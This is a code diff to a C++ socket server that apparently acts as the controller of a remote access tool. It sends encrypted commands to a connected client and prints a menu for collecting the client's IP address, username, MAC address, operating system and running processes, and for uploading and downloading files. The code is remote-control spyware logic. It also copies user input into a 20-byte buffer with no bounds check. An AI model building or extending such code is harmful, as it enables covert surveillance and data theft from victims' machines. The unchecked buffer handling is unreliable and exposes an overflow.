@@ -167,22 +167,25 @@ int func(SOCKET connfd)
     // infinite loop for chat
     for (;;) {
         bzero(buff, MAX);
+        bzero(filename, 20);
         cout << "Command for client : " << endl;
         n = 0;
         // copy server message in the buffer
         while ((buff[n++] = getchar()) != '\n')
             ;
 
-        if (strstr(buff, "upload")) {
+        if (strstr(buff, "UPLOAD")) {
             char* token = strtok(buff, " ");
             token = strtok(NULL, " ");
             strcpy(filename, token);
             filename[strlen(filename)-1] = '\0';
         }
 
+        printf("buffer: %s", buff);
         string encryptedBuff = encrypt(string(buff));
         strncpy(buff, encryptedBuff.c_str(), encryptedBuff.size());
         buff[encryptedBuff.size()] = '\0';
+        printf("encrypted buffer: %s", buff);
 
         // and send that buffer to client
         send(connfd, buff, sizeof(buff), 0); // buff might be too small for files
@@ -194,7 +197,7 @@ int func(SOCKET connfd)
         strncpy(buff, decryptedBuff.c_str(), decryptedBuff.size());
         buff[decryptedBuff.size()] = '\0';
 
-        if (strstr(buff, "download")) {
+        if (strstr(buff, "DOWNLOAD")) {
             char* token = strtok(buff, " ");
             token = strtok(NULL, " ");
             char downloadFile[20];
@@ -225,7 +228,7 @@ int func(SOCKET connfd)
         // if the given command is download, the server should receive only the file's
         // content from the client and will send the command to the client as received
         // from the user on the server.
-        if (strlen(filename) != 0) {
+        if (filename[0] != '\0') {
             FILE * file;
             if ((file = fopen(filename, "w")) == NULL) {
                 cout << "unable to create file on server!\n" << endl;
@@ -236,7 +239,7 @@ int func(SOCKET connfd)
         }
 
         // print buffer which contains the client contents
-        cout << "Client's response:\n" << buff << endl;
+        cout << "\nClient's response:\n" << buff << endl;
         bzero(buff, MAX);
 
         // if msg contains "Exit" then server exit and chat ended.
@@ -326,15 +329,15 @@ int main()
         return 1;
     }
 
+    cout << "\nInformation to get from client:\n\tIPAddress : this will gather the client's IP Addess\n\t"
+        "Username : this will gather the client's username\n\tMacAddress : this will gather the client's" 
+        "MAC Address\n\tOS : this will gather the client's Operating System\n\tprocesses : this will"
+        "list out the client's running processes\n\tupload <file path> : this will upload a file to the"
+        "client\n\tdownload <file path> : this will download a file from the client\n\texit: close the"
+        "server socket\n\n" << endl;
+
     func(ClientSocket);
 
     // No longer need server socket
     closesocket(ListenSocket);
-   
-    cout << "\nInformation to get from client:\n\tIPAddress : this will gather the client's IP Addess\n\t"
-            "Username : this will gather the client's username\n\tMacAddress : this will gather the client's" 
-            "MAC Address\n\tOS : this will gather the client's Operating System\n\tprocesses : this will"
-            "list out the client's running processes\n\tupload <file path> : this will upload a file to the"
-            "client\n\tdownload <file path> : this will download a file from the client\n\n" << endl;
-    // Function for chatting between client and server
 }
